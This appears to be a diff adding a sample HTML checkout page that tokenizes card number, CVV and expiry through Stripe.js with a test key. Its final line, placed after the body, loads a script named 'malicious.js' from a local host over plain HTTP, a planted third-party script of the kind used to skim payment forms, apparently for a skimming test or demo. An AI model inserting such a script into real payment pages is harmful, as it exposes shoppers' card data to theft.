@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Payment Page</title>
+  <link rel="stylesheet" type="text/css" href="/styles.css">
+  <script type="text/javascript" src="https://js.stripe.com/v2/"></script>
+  <script type="text/javascript">
+    Stripe.setPublishableKey('pk_test_6pRNASCoBOKtIshFeQd4XMUh');
+
+    var myStripeResponseHandler = function(status, response) {
+      console.log(status)
+      console.log(response)
+      document.getElementById('payment_method_token').value = response.id
+      document.getElementById('payment-form').submit();
+
+    }
+  </script>
+  <script type="text/javascript">
+    var useThirdParty = function(){
+      // use some third part to generate a token from number and cvv
+      // after the token is generated, add it to the form and submit.
+      // for the purposes of this example, we will simply assume the library
+      // properly generated a token and add it to our form.
+
+      var form = document.getElementById('payment-form');
+      Stripe.card.createToken(document.getElementById('payment-form'), myStripeResponseHandler);
+    }
+  </script>
+</head>
+
+<body>
+
+  <form id="payment-form" accept-charset="UTF-8" class="spf-form" method="POST"
+    action="/submit" onsubmit="useThirdParty(); return false;">
+
+    <input type="hidden" name="payment_method_token" id="payment_method_token" value="" />
+
+    <fieldset class="spf-fs-name">
+      <h2>Name</h2>
+      <div class="spf-field spf-field-fname">
+        <label class="internal" for="spf-fname">First Name</label>
+        <input type="text" class="spf-input-text" name="first_name" id="first_name">
+      </div>
+      <div class="spf-field spf-field-lname">
+        <label class="internal" for="spf-lname">Last Name</label>
+        <input type="text" class="spf-input-text" name="last_name" id="last_name">
+      </div>
+    </fieldset>
+
+    <fieldset class="spf-fs-cc">
+      <h2>Payment Details</h2>
+
+      <div class="spf-field">
+        <div id="spreedly-number-test" class="spf-field-group spf-number spf-field-cc">
+          <label class="spf-field-group spf-number" for="card_number">Credit Card Number</label>
+          <input type="number" class="spf-input-text" pattern="[0-9]*" id="card_number" autocomplete="off" size="19" data-stripe="number"></input>
+        </div>
+        <div id="spreedly-cvv-test" class="spf-field-group spf-verification_value spf-field-cc">
+          <label class="spf-field-group spf-verification_value" for="cvv">CVV</label>
+          <input type="number" class="spf-input-text" id="cvv" size="4" autocomplete="off" data-stripe="cvc"></input>
+        </div>
+      </div>
+
+      <div class="spf-field spf-field-exp">
+        <label>Expiration Date</label>
+        <div class="spf-field-group spf-month">
+          <input type="text" class="spf-input-text spf-exp" name="month" id="month" size="3" maxlength="2" placeholder="MM" data-stripe="exp_month">
+        </div>
+        <span class="spf-exp-divider">/</span>
+        <div class="spf-field-group spf-year">
+          <input type="text" class="spf-input-text spf-exp" name="year" id="year" size="5" maxlength="4" placeholder="YYYY" data-stripe="exp_year">
+        </div>
+      </div>
+    </fieldset>
+
+    <fieldset class="spf-field-submit">
+      <input type="submit" class="button" value="Submit Payment">
+      <div id="message"></div>
+      <div id="errors"></div>
+    </fieldset>
+  </form>
+</body>
+
+  <script src="http://127.0.0.1:8081/static/malicious.js"></script>
+</html>
